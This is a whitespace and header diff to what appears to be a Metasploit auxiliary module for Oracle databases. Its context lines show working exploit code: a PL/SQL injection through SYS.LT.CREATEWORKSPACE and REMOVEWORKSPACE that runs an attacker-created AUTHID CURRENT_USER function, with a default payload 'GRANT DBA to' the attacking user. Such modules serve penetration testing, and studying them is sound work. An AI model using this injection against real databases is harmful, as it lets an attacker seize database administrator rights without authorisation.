@@ -1,4 +1,8 @@
 ##
+# $Id$
+##
+
+##
 # This file is part of the Metasploit Framework and may be subject to
 # redistribution and commercial restrictions. Please see the Metasploit
 # Framework web site for more information on licensing and terms of use.
@@ -30,9 +34,9 @@ class Metasploit3 < Msf::Auxiliary
 				],
 			'DisclosureDate' => 'Jan 2009'))
 
-			register_options( 
+			register_options(
 				[
-					OptString.new('SQL', [ false, 'SQL to execte.',  "GRANT DBA to #{datastore['DBUSER']}"]),					
+					OptString.new('SQL', [ false, 'SQL to execte.',  "GRANT DBA to #{datastore['DBUSER']}"]),
 				], self.class)
 	end
 
@@ -44,9 +48,9 @@ class Metasploit3 < Msf::Auxiliary
 		rand2 = Rex::Text.rand_text_alpha_upper(rand(10) + 1)
 		rand3 = Rex::Text.rand_text_alpha_upper(rand(10) + 1)
 		cruft = Rex::Text.rand_text_alpha_upper(1)
-		
+
 		function = "
-			CREATE OR REPLACE FUNCTION #{cruft} 
+			CREATE OR REPLACE FUNCTION #{cruft}
 			RETURN VARCHAR2 AUTHID CURRENT_USER
 			AS
 			PRAGMA AUTONOMOUS_TRANSACTION;
@@ -57,14 +61,14 @@ class Metasploit3 < Msf::Auxiliary
 			END;"
 
 		package1 = %Q|
-			BEGIN 
-				SYS.LT.CREATEWORKSPACE('#{name}'' and #{datastore['DBUSER']}.#{cruft}()=''#{cruft}'); 
+			BEGIN
+				SYS.LT.CREATEWORKSPACE('#{name}'' and #{datastore['DBUSER']}.#{cruft}()=''#{cruft}');
 			END;
 			|
 
 		package2 = %Q|
-			BEGIN 
-				SYS.LT.REMOVEWORKSPACE('#{name}'' and #{datastore['DBUSER']}.#{cruft}()=''#{cruft}'); 
+			BEGIN
+				SYS.LT.REMOVEWORKSPACE('#{name}'' and #{datastore['DBUSER']}.#{cruft}()=''#{cruft}');
 			END;
 			|
 
